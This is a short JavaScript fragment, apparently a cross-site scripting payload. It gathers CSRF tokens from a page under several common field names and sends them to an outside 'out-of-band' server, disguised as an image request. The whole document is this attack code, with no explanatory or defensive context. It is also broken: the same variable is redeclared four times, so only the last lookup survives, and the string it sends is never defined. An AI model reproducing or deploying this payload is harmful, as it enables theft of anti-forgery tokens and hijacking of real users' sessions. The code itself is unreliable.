var csrfTokens = document.getElementsByName('csrf_token');
var csrfTokens = document.getElementsByName('x-csrf-token');
var csrfTokens = document.getElementsByName('x-csrf');
var csrfTokens = document.getElementsByName('authenticity-token');

var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://OurOwnOutOfBandServer.com/csrf_tokens.png?tokens=' + csrfTokenString, true);
xhr.send();



